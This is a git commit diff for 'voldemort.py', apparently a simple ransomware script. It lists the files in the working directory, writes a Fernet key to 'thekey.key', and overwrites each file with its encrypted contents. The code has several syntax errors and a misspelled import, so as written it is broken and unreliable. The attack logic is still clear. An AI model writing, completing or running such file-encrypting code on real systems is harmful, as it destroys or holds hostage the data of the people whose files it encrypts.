5c4fd8208f05dca1aa3c56b74f9b58092f73ff8b
unfavorablesemi <105513420+unfavorablesemi@users.noreply.github.com>
2022-05-17 14:34:00 -0400

    Update voldemort.py

--- voldemort.py
+++ voldemort.py
@@ -1,8 +1,27 @@
+#!/usr/bin/env python3
 
 import os
+from cryptography.fernet import Frenet
 
 #lets find some files
 
-files= []
+files = []
 
-for file in os.listdir()
+for file in os.listdir():
+        if file == "voldimrt.py" or file == "thekey.key":
+                continue
+        if os.path.isfile(file):
+                files.append(file)
+print(files)
+
+key = Fernet.generate_key()
+
+with open("thekey.key", "wb") as thekey:
+        thekey.write(key)
+        
+for file in files:
+        with open(file, "rb") as thefile:
+                contents = thefile.read()
+        contents_encrypted = Fernet(key).encrypt(contents)
+        with open(file "wb") as thefile:
+                thefile.write(contents encrypted)
